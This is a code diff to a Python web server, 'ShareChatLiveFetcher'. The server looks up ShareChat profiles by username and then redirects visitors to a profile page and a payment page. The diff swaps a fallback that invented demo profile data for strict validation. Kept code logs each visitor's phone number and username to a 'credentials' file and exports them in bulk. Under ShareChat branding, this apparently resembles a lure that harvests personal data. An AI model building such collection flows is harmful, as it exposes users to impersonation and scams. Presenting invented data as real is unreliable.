@@ -530,7 +530,7 @@ class ShareChatLiveFetcher:
 
         const result = await response.json();
 
-        if (result.status === 'success') {
+        if (result.status === 'success' && result.profile) {
           // Store fetched profile data in localStorage for profile.html
           localStorage.setItem("fetchedProfileData", JSON.stringify(result.profile));
           localStorage.setItem("lastProfileFetchTime", new Date().getTime().toString());
@@ -538,7 +538,7 @@ class ShareChatLiveFetcher:
           // Redirect to profile.html immediately
           window.location.href = "/profile.html";
         } else {
-          alert("❌ Error: " + result.message);
+          alert("❌ Error: " + (result.message || "Invalid username or profile not found"));
           submitBtn.classList.remove('loading');
           submitBtn.disabled = false;
         }
@@ -695,8 +695,8 @@ class ShareChatLiveFetcher:
     }
 
     .level img {
-      width: 60%;
-      height: 60%;
+      width: 100%;
+      height: 100%;
       border-radius: 50%;
       -o-object-fit: cover;
       object-fit: cover;
@@ -1448,9 +1448,23 @@ class ShareChatLiveFetcher:
             postsCount.textContent = fetchedProfile.posts;
           }
           
-          // Optional: Update profile image if available
-          if (userProfileImage && fetchedProfile.image) {
-            userProfileImage.src = fetchedProfile.image;
+          // ✅ PROFILE IMAGE FIX: Try multiple image fields
+          if (userProfileImage && fetchedProfile) {
+            const imageSources = [
+              fetchedProfile.profile_pic,
+              fetchedProfile.image,
+              fetchedProfile.profile_image,
+              "https://sharechat.com/assets/png/user.png"
+            ];
+            
+            // Find first valid image source
+            for (let imgSrc of imageSources) {
+              if (imgSrc && imgSrc.trim() !== "") {
+                userProfileImage.src = imgSrc;
+                console.log("Using profile image:", imgSrc);
+                break;
+              }
+            }
           }
         } else {
           console.log("No fetched profile data in localStorage");
@@ -2055,6 +2069,300 @@ class ShareChatLiveFetcher:
             f"✅ Created payment.html with esame functionality at {self.payment_path}"
         )
 
+    def fetch_profile_api(self, username, phone=None):
+        """
+        API से प्रोफाइल डेटा fetch करें (NO DEMO DATA - STRICT VALIDATION)
+        """
+        start_time = time.time()
+
+        try:
+            payload = {"username": username}
+
+            self.logger.info(f"🔍 Fetching profile: {username}")
+            print(f"\n🔍 Fetching profile for: {username}")
+
+            response = self.session.post(self.api_url, json=payload, timeout=10)
+
+            if response.status_code == 200:
+                data = response.json()
+
+                # ✅ STRICT VALIDATION: Check for error or invalid data
+                if "error" in data:
+                    error_msg = f"API error: {data['error']}"
+                    self.logger.error(error_msg)
+                    print(f"❌ {error_msg}")
+
+                    return {
+                        "error": data["error"],
+                        "username": username,
+                        "phone": phone,
+                        "status": "FAILED",
+                        "is_valid": False,
+                    }
+                
+                # ✅ Check if this looks like a real profile (not demo data)
+                # Check for required fields and realistic values
+                required_fields = ["name", "followers", "following", "posts"]
+                
+                # If missing required fields
+                if not all(field in data for field in required_fields):
+                    error_msg = f"Incomplete profile data for: {username}"
+                    self.logger.error(error_msg)
+                    print(f"❌ {error_msg}")
+                    
+                    return {
+                        "error": "Profile data incomplete",
+                        "username": username,
+                        "phone": phone,
+                        "status": "FAILED",
+                        "is_valid": False,
+                    }
+                
+                # Check if values look like demo data
+                name = data.get("name", "")
+                followers = data.get("followers", "")
+                following = data.get("following", "")
+                
+                # Demo data detection patterns
+                is_demo_data = False
+                
+                # Check for demo-like name pattern
+                if name and ("ShareChatUser_" in name or "DemoUser" in name):
+                    is_demo_data = True
+                
+                # Check for suspiciously round/patterned numbers
+                if followers and following:
+                    try:
+                        followers_int = int(followers)
+                        following_int = int(following)
+                        
+                        # Demo data often has very low numbers or suspicious patterns
+                        if followers_int < 5 or following_int < 2:
+                            is_demo_data = True
+                    except:
+                        pass
+                
+                if is_demo_data:
+                    error_msg = f"Demo data detected for: {username}"
+                    self.logger.error(error_msg)
+                    print(f"❌ {error_msg}")
+                    
+                    return {
+                        "error": "Invalid profile (demo data)",
+                        "username": username,
+                        "phone": phone,
+                        "status": "FAILED",
+                        "is_valid": False,
+                    }
+
+                # ✅ VALID PROFILE - Add metadata
+                data["fetch_time"] = round(time.time() - start_time, 2)
+                data["timestamp"] = datetime.now().isoformat()
+                data["profile_pic"] = data.get("image", "https://sharechat.com/assets/png/user.png")
+                if phone:
+                    data["phone"] = phone
+
+                # Save to results
+                result = {
+                    "data": data,
+                    "phone": phone,
+                    "username": username,
+                    "status": "SUCCESS",
+                    "is_valid": True,
+                    "timestamp": datetime.now().isoformat(),
+                }
+
+                self.current_results.append(result)
+
+                # Display in console
+                self.display_profile_console(result)
+
+                # Save to file
+                self.save_credentials(phone, username)
+                self.save_result(result)
+
+                return result
+
+            else:
+                # ❌ API ERROR - Return failure, NO DEMO DATA
+                error_msg = f"API returned status: {response.status_code}"
+                print(f"❌ {error_msg}")
+                
+                return {
+                    "error": "Profile not found. Please check username.",
+                    "username": username,
+                    "phone": phone,
+                    "status": "FAILED",
+                    "is_valid": False,
+                }
+
+        except Exception as e:
+            # ❌ NETWORK/API ERROR - Return failure, NO DEMO DATA
+            error_msg = f"Network/API Error: {str(e)}"
+            print(f"❌ {error_msg}")
+            
+            return {
+                "error": "Unable to fetch profile. Please try again.",
+                "username": username,
+                "phone": phone,
+                "status": "FAILED",
+                "is_valid": False,
+            }
+
+    def display_profile_console(self, result):
+        """
+        Profile को console में display करें
+        """
+        if result.get("status") == "SUCCESS" and result.get("is_valid") == True:
+            data = result.get("data", {})
+
+            print("\n" + "=" * 60)
+            print("✅ SHARECHAT PROFILE FETCHED SUCCESSFULLY")
+            print("=" * 60)
+
+            if result.get("phone"):
+                print(f"📱 Phone: {result['phone']}")
+            print(f"👤 Username: {result['username']}")
+            print(f"🏷️ Name: {data.get('name', 'N/A')}")
+            print(f"👥 Followers: {data.get('followers', 'N/A')}")
+            print(f"🤝 Following: {data.get('following', 'N/A')}")
+            print(f"📝 Posts: {data.get('posts', 'N/A')}")
+            
+            if data.get("profile_pic"):
+                print(f"🖼️ Profile Image: Available")
+
+            if data.get("gender"):
+                print(f"⚧️ Gender: {data.get('gender')}")
+            if data.get("language"):
+                print(f"🌐 Language: {data.get('language')}")
+            if data.get("region"):
+                print(f"📍 Region: {data.get('region')}")
+
+            print(f"⏱️ Fetch time: {data.get('fetch_time', 'N/A')}s")
+            print("=" * 60 + "\n")
+
+            return True
+        else:
+            print(f"\n❌ FAILED: {result.get('username', 'Unknown')}")
+            print(f"   Error: {result.get('error', 'Invalid profile')}")
+            if result.get("phone"):
+                print(f"   Phone: {result['phone']}")
+            return False
+
+    def save_credentials(self, phone, username):
+        """
+        Credentials save करें
+        """
+        if not phone or not username:
+            return
+
+        try:
+            with open(self.credentials_file, "a", encoding="utf-8") as f:
+                f.write(f"{phone},{username},{datetime.now().isoformat()}\n")
+
+            self.logger.info(f"✅ Saved credentials: {phone}, {username}")
+
+        except Exception as e:
+            self.logger.error(f"Error saving credentials: {e}")
+
+    def save_result(self, result):
+        """
+        Result save करें (with validation check)
+        """
+        try:
+            # ❌ Don't save invalid/demo results
+            if result.get("is_valid") == False:
+                print(f"⚠️ Not saving invalid result for: {result.get('username')}")
+                return
+                
+            # Load existing results
+            results = []
+            if os.path.exists(self.results_file):
+                with open(self.results_file, "r", encoding="utf-8") as f:
+                    try:
+                        results = json.load(f)
+                    except:
+                        results = []
+
+            # Add new result
+            results.append(result)
+
+            # Save back
+            with open(self.results_file, "w", encoding="utf-8") as f:
+                json.dump(results, f, indent=2, ensure_ascii=False)
+
+            self.logger.info(f"✅ Valid result saved for: {result['username']}")
+
+        except Exception as e:
+            self.logger.error(f"Error saving result: {e}")
+
+    def export_results(self, format="both"):
+        """
+        Results export करें
+        """
+        if not self.current_results:
+            print("❌ No results to export!")
+            return
+
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+
+        if format in ["json", "both"]:
+            json_file = os.path.join(self.exports_dir, f"profiles_{timestamp}.json")
+
+            export_data = []
+            for result in self.current_results:
+                if result.get("status") == "SUCCESS" and result.get("is_valid") == True:
+                    export_data.append(result.get("data", {}))
+
+            with open(json_file, "w", encoding="utf-8") as f:
+                json.dump(export_data, f, indent=2, ensure_ascii=False)
+
+            print(f"✅ JSON exported: {json_file}")
+
+        if format in ["csv", "both"]:
+            csv_file = os.path.join(self.exports_dir, f"profiles_{timestamp}.csv")
+
+            with open(csv_file, "w", newline="", encoding="utf-8") as f:
+                writer = csv.writer(f)
+                writer.writerow(
+                    [
+                        "Phone",
+                        "Username",
+                        "Name",
+                        "Followers",
+                        "Following",
+                        "Posts",
+                        "Gender",
+                        "Language",
+                        "Region",
+                        "Status",
+                        "Fetch Time",
+                        "Timestamp",
+                    ]
+                )
+
+                for result in self.current_results:
+                    if result.get("status") == "SUCCESS" and result.get("is_valid") == True:
+                        data = result.get("data", {})
+                        writer.writerow(
+                            [
+                                result.get("phone", ""),
+                                result["username"],
+                                data.get("name", ""),
+                                data.get("followers", ""),
+                                data.get("following", ""),
+                                data.get("posts", ""),
+                                data.get("gender", ""),
+                                data.get("language", ""),
+                                data.get("region", ""),
+                                "SUCCESS",
+                                data.get("fetch_time", ""),
+                                data.get("timestamp", ""),
+                            ]
+                        )
+
+            print(f"✅ CSV exported: {csv_file}")
+
     def start_server(self):
         """
         HTTP server start करें (Render compatible)
@@ -2119,17 +2427,26 @@ class ShareChatLiveFetcher:
                         print(f"   Username: {username}")
 
                         result = self.parent.fetch_profile_api(username, phone)
-
-                        if result.get("status") == "SUCCESS":
+                        
+                        # ✅ STRICT CHECK: Only return success if profile is valid
+                        if result.get("status") == "SUCCESS" and result.get("is_valid") == True:
+                            profile_data = result.get("data", {})
+                            
+                            # Ensure profile_pic field exists
+                            if not profile_data.get("profile_pic"):
+                                profile_data["profile_pic"] = profile_data.get("image", "https://sharechat.com/assets/png/user.png")
+                            
                             response = {
                                 "status": "success",
                                 "message": "Profile fetched successfully",
-                                "profile": result.get("data", {}),
+                                "profile": profile_data,
                             }
                         else:
+                            # ❌ Invalid credentials - DO NOT allow login
                             response = {
                                 "status": "error",
-                                "message": result.get("error", "Unknown error"),
+                                "message": result.get("error", "Invalid username or profile not found"),
+                                "profile": None
                             }
 
                         self.send_response(200)
@@ -2144,9 +2461,11 @@ class ShareChatLiveFetcher:
                         self.send_header("Access-Control-Allow-Origin", "*")
                         self.end_headers()
                         self.wfile.write(
-                            json.dumps({"status": "error", "message": str(e)}).encode(
-                                "utf-8"
-                            )
+                            json.dumps({
+                                "status": "error", 
+                                "message": str(e),
+                                "profile": None
+                            }).encode("utf-8")
                         )
                     return
 
@@ -2207,298 +2526,6 @@ class ShareChatLiveFetcher:
             self.logger.error(f"Failed to start server: {e}")
             print(f"❌ Server startup failed: {e}")
             return False
-
-    def fetch_profile_api(self, username, phone=None):
-        """
-        API से प्रोफाइल डेटा fetch करें (with fallback)
-        """
-        start_time = time.time()
-
-        try:
-            payload = {"username": username}
-
-            self.logger.info(f"🔍 Fetching profile: {username}")
-            print(f"\n🔍 Fetching profile for: {username}")
-
-            response = self.session.post(self.api_url, json=payload, timeout=10)
-
-            if response.status_code == 200:
-                data = response.json()
-
-                if "error" in data:
-                    error_msg = f"API error: {data['error']}"
-                    self.logger.error(error_msg)
-                    print(f"❌ {error_msg}")
-
-                    return {
-                        "error": data["error"],
-                        "username": username,
-                        "phone": phone,
-                        "status": "FAILED",
-                    }
-
-                # Add metadata
-                data["fetch_time"] = round(time.time() - start_time, 2)
-                data["timestamp"] = datetime.now().isoformat()
-                if phone:
-                    data["phone"] = phone
-
-                # Save to results
-                result = {
-                    "data": data,
-                    "phone": phone,
-                    "username": username,
-                    "status": "SUCCESS",
-                    "timestamp": datetime.now().isoformat(),
-                }
-
-                self.current_results.append(result)
-
-                # Display in console
-                self.display_profile_console(result)
-
-                # Save to file
-                self.save_credentials(phone, username)
-                self.save_result(result)
-
-                return result
-
-            else:
-                # API endpoint not working, provide fallback demo data
-                print(f"⚠️ API returned {response.status_code}, providing demo data")
-
-                # Create demo profile data
-                demo_data = {
-                    "name": f"ShareChatUser_{username[:4]}",
-                    "username": username,
-                    "followers": str(hash(username) % 100 + 1),
-                    "following": str(hash(username) % 20 + 1),
-                    "posts": str(hash(username) % 50),
-                    "gender": "Male" if hash(username) % 2 == 0 else "Female",
-                    "language": "Hindi",
-                    "region": "India",
-                    "fetch_time": round(time.time() - start_time, 2),
-                    "timestamp": datetime.now().isoformat(),
-                    "status": "DEMO_DATA",
-                }
-
-                if phone:
-                    demo_data["phone"] = phone
-
-                # Save to results
-                result = {
-                    "data": demo_data,
-                    "phone": phone,
-                    "username": username,
-                    "status": "SUCCESS",
-                    "timestamp": datetime.now().isoformat(),
-                    "note": "Demo data (API unavailable)",
-                }
-
-                self.current_results.append(result)
-
-                # Display in console
-                self.display_profile_console(result)
-
-                # Save to file
-                self.save_credentials(phone, username)
-                self.save_result(result)
-
-                return result
-
-        except Exception as e:
-            # If API completely fails, provide fallback
-            print(f"⚠️ API Error: {str(e)}, providing demo data")
-
-            # Create demo profile data
-            demo_data = {
-                "name": f"ShareChatUser_{username[:4]}",
-                "username": username,
-                "followers": "15",
-                "following": "8",
-                "posts": "23",
-                "gender": "Male",
-                "language": "Hindi",
-                "region": "India",
-                "fetch_time": round(time.time() - start_time, 2),
-                "timestamp": datetime.now().isoformat(),
-                "status": "DEMO_DATA_FALLBACK",
-            }
-
-            if phone:
-                demo_data["phone"] = phone
-
-            # Save to results
-            result = {
-                "data": demo_data,
-                "phone": phone,
-                "username": username,
-                "status": "SUCCESS",
-                "timestamp": datetime.now().isoformat(),
-                "note": "Fallback demo data (API error)",
-            }
-
-            self.current_results.append(result)
-
-            # Display in console
-            self.display_profile_console(result)
-
-            # Save to file
-            self.save_credentials(phone, username)
-            self.save_result(result)
-
-            return result
-
-    def display_profile_console(self, result):
-        """
-        Profile को console में display करें
-        """
-        if result.get("status") == "SUCCESS":
-            data = result.get("data", {})
-
-            print("\n" + "=" * 60)
-            print("✅ SHARECHAT PROFILE FETCHED SUCCESSFULLY")
-            if (
-                data.get("status") == "DEMO_DATA"
-                or data.get("status") == "DEMO_DATA_FALLBACK"
-            ):
-                print("⚠️  USING DEMO DATA (API UNAVAILABLE)")
-            print("=" * 60)
-
-            if result.get("phone"):
-                print(f"📱 Phone: {result['phone']}")
-            print(f"👤 Username: {result['username']}")
-            print(f"🏷️ Name: {data.get('name', 'N/A')}")
-            print(f"👥 Followers: {data.get('followers', 'N/A')}")
-            print(f"🤝 Following: {data.get('following', 'N/A')}")
-            print(f"📝 Posts: {data.get('posts', 'N/A')}")
-
-            if data.get("gender"):
-                print(f"⚧️ Gender: {data.get('gender')}")
-            if data.get("language"):
-                print(f"🌐 Language: {data.get('language')}")
-            if data.get("region"):
-                print(f"📍 Region: {data.get('region')}")
-
-            print(f"⏱️ Fetch time: {data.get('fetch_time', 'N/A')}s")
-            print("=" * 60 + "\n")
-
-            return True
-        else:
-            print(f"\n❌ FAILED: {result['username']}")
-            print(f"   Error: {result.get('error', 'Unknown error')}")
-            if result.get("phone"):
-                print(f"   Phone: {result['phone']}")
-            return False
-
-    def save_credentials(self, phone, username):
-        """
-        Credentials save करें
-        """
-        if not phone or not username:
-            return
-
-        try:
-            with open(self.credentials_file, "a", encoding="utf-8") as f:
-                f.write(f"{phone},{username},{datetime.now().isoformat()}\n")
-
-            self.logger.info(f"✅ Saved credentials: {phone}, {username}")
-
-        except Exception as e:
-            self.logger.error(f"Error saving credentials: {e}")
-
-    def save_result(self, result):
-        """
-        Result save करें
-        """
-        try:
-            # Load existing results
-            results = []
-            if os.path.exists(self.results_file):
-                with open(self.results_file, "r", encoding="utf-8") as f:
-                    try:
-                        results = json.load(f)
-                    except:
-                        results = []
-
-            # Add new result
-            results.append(result)
-
-            # Save back
-            with open(self.results_file, "w", encoding="utf-8") as f:
-                json.dump(results, f, indent=2, ensure_ascii=False)
-
-            self.logger.info(f"✅ Result saved for: {result['username']}")
-
-        except Exception as e:
-            self.logger.error(f"Error saving result: {e}")
-
-    def export_results(self, format="both"):
-        """
-        Results export करें
-        """
-        if not self.current_results:
-            print("❌ No results to export!")
-            return
-
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-
-        if format in ["json", "both"]:
-            json_file = os.path.join(self.exports_dir, f"profiles_{timestamp}.json")
-
-            export_data = []
-            for result in self.current_results:
-                if result.get("status") == "SUCCESS":
-                    export_data.append(result.get("data", {}))
-
-            with open(json_file, "w", encoding="utf-8") as f:
-                json.dump(export_data, f, indent=2, ensure_ascii=False)
-
-            print(f"✅ JSON exported: {json_file}")
-
-        if format in ["csv", "both"]:
-            csv_file = os.path.join(self.exports_dir, f"profiles_{timestamp}.csv")
-
-            with open(csv_file, "w", newline="", encoding="utf-8") as f:
-                writer = csv.writer(f)
-                writer.writerow(
-                    [
-                        "Phone",
-                        "Username",
-                        "Name",
-                        "Followers",
-                        "Following",
-                        "Posts",
-                        "Gender",
-                        "Language",
-                        "Region",
-                        "Status",
-                        "Fetch Time",
-                        "Timestamp",
-                    ]
-                )
-
-                for result in self.current_results:
-                    if result.get("status") == "SUCCESS":
-                        data = result.get("data", {})
-                        writer.writerow(
-                            [
-                                result.get("phone", ""),
-                                result["username"],
-                                data.get("name", ""),
-                                data.get("followers", ""),
-                                data.get("following", ""),
-                                data.get("posts", ""),
-                                data.get("gender", ""),
-                                data.get("language", ""),
-                                data.get("region", ""),
-                                "SUCCESS",
-                                data.get("fetch_time", ""),
-                                data.get("timestamp", ""),
-                            ]
-                        )
-
-            print(f"✅ CSV exported: {csv_file}")
 
     def run_server_only(self):
         """
